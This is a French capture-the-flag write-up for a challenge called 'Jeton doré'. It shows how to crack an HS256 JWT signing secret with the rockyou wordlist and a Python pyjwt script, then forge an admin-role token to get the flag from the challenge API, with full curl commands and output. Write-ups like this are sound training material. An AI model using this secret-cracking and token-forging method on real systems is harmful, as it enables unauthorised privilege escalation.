# Jeton doré

## Énoncé

Nos meilleurs développeurs ont redeveloppé l'application d'authentification.

Normalement, nous sommes protégés ? Vraiment?

https://golden.izo27k5.org 

## Solution

En suivant l'URL, on tombe sur un fichier swagger qui décrit une API:

![api](api.png)

On commence par solliciter la fonction d'enregistrement qui demande en entrée un nom d'utilisateur et un mot de passe (le swagger permet de générer une requête cURL quand on ne sait pas faire) :

```console
$ curl https://golden.izo27k5.org/api/register -H "Accept: application/json" -H "Content-Type: application/json" -d '{"email": "plop", "name": "plop"}'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2MzY5MTE1MSwianRpIjoiMGU4ZDk3MGUtZjZmNi00NTJiLWJjMTYtZDhkM2E2OTg2ZTQzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6bnVsbCwibmJmIjoxNjYzNjkxMTUxLCJleHAiOjE2NjM2OTIwNTEsInJvbGUiOiJndWVzdCJ9.tol3KEjAGIX-HFV4DrjnVJImXJLRRI6aTPGpV_sJOyY"}
```

En retour, on a un token qui va nous permettre d'appeler les autres fonctions. On commence par `/download`, et on se rend compte que l'API nous retourne un fichier, une archive ZIP pour être précis :

```console
$ curl https://golden.izo27k5.org/api/download -H "Accept: application/json" -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2MzY5MTExMywianRpIjoiMGZmNWU4ZjAtMzgyNC00ZjY5LWI5NjMtZDY2NGNiZWY4Mjc4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6bnVsbCwibmJmIjoxNjYzNjkxMTEzLCJleHAiOjE2NjM2OTIwMTMsInJvbGUiOiJndWVzdCJ9.3j3R3GOzkq6gpyv_pcSq6wOlvre5-YZkqB6eSwlrcec" -o download.zip
$ unzip -t download.zip 
Archive:  download.zip
    testing: rockyou.txt              OK
No errors detected in compressed data of download.zip.
```

Tiens, une liste de mots de passe ! Serait-il possible que cela nous serve pour la suite ? ;-)

Essayons de solliciter l'autre fonction :
```console
$ curl https://golden.izo27k5.org/api/protected -H "Accept: application/json" -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2MzY5MTExMywianRpIjoiMGZmNWU4ZjAtMzgyNC00ZjY5LWI5NjMtZDY2NGNiZWY4Mjc4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6bnVsbCwibmJmIjoxNjYzNjkxMTEzLCJleHAiOjE2NjM2OTIwMTMsInJvbGUiOiJndWVzdCJ9.3j3R3GOzkq6gpyv_pcSq6wOlvre5-YZkqB6eSwlrcec" 
{"flag":"no admin, no flag","logged_in_as":"guest"}
```

Ok, on n'a visiblement pas les droits. Jetons un coup d'œil au token qui nous a été fourni, ça ressemble à un [JWT](https://jwt.io/) qui porte probablement notre rôle :

![jwt](jwt.png)

Les points importants :
- effectivement, le rôle `guest` est porté par le token.
- le token est de type `HS256`, ce qui signifie qu'il est signé à partir d'une clef secrète.

Idéalement, il faudrait qu'on puisse créer un token JWT dont le rôle vaudrait `admin`. En théorie, ce n'est pas possible, car on n'a pas la clef secrète utilisée pour la signature. Mais comme on nous a donné une wordlist avant, se pourrait-il qu'elle contienne la clef utilisée ?

Pour confirmer, on se code un script python s'appuyant sur le module [pyjwt](https://pyjwt.readthedocs.io/en/latest/) qui va:
- prendre un token valide en argument.
- trouver la clef secrète en tentant de valider le token pour chacun des mots de passe de la wordlist.
- si on trouve la clef secrète, regénérer un token avec le bon rôle.

```python
#!/usr/bin/env python3

# pip install pyjwt[crypto]
import jwt
import sys

if len(sys.argv) != 2:
    print(f'Syntax: {sys.argv[0]} <valid_token>')
    exit(-1)
token=sys.argv[1]

passwords = open('rockyou.txt', 'rb').read().splitlines()
for p in passwords:
    try: 
        # On tente de valider le token (si raté, exception !)
        content = jwt.decode(token, key=p, algorithms=['HS256', ])
        print(f'Found the secret key: {p}')
        print(f'Initial token content: {content}')
        
        # On forge un nouveau token
        content['role'] = 'admin'
        print(f'New token content: {content}')
        token = jwt.encode(content, key=p, algorithm="HS256")
        print(f'Forged token: {token}')
        exit(0)

    except Exception as e:
        pass
```

Attention, les tokens expirent, donc il faut lancer le script en lui passant un token relativement récent. On obtient :

```console
$ python3 forge_jwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2MzY5MjYzNywianRpIjoiM2VjMDkxMzMtMGZlMi00NjJmLWI1NmMtOTViM2JkYzJlZDYyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6bnVsbCwibmJmIjoxNjYzNjkyNjM3LCJleHAiOjE2NjM2OTM1MzcsInJvbGUiOiJndWVzdCJ9.Z-5rDJqeARx-tQByVewGLIyGcN88G_14pgI8STLwha4
Found the secret key: b'norisknofun'
Initial token content: {'fresh': False, 'iat': 1663692637, 'jti': '3ec09133-0fe2-462f-b56c-95b3bdc2ed62', 'type': 'access', 'sub': None, 'nbf': 1663692637, 'exp': 1663693537, 'role': 'guest'}
New token content: {'fresh': False, 'iat': 1663692637, 'jti': '3ec09133-0fe2-462f-b56c-95b3bdc2ed62', 'type': 'access', 'sub': None, 'nbf': 1663692637, 'exp': 1663693537, 'role': 'admin'}
Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2MzY5MjYzNywianRpIjoiM2VjMDkxMzMtMGZlMi00NjJmLWI1NmMtOTViM2JkYzJlZDYyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6bnVsbCwibmJmIjoxNjYzNjkyNjM3LCJleHAiOjE2NjM2OTM1MzcsInJvbGUiOiJhZG1pbiJ9.vt7I3RQYGqvGXTPuqgfOGv9i1FMrN8fBKeGZFoKySfE
```

On croise les doigts en rappelant la fonction `/protected` à l'aide de notre token tout neuf :
```console
$ curl https://golden.izo27k5.org/api/protected -H "Accept: application/json" -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2MzY5MjYzNywianRpIjoiM2VjMDkxMzMtMGZlMi00NjJmLWI1NmMtOTViM2JkYzJlZDYyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6bnVsbCwibmJmIjoxNjYzNjkyNjM3LCJleHAiOjE2NjM2OTM1MzcsInJvbGUiOiJhZG1pbiJ9.vt7I3RQYGqvGXTPuqgfOGv9i1FMrN8fBKeGZFoKySfE" 
{"flag":"INNN{T0K3n_N33d_T0_B3_S3cur3d}","logged_in_as":"admin"}
```
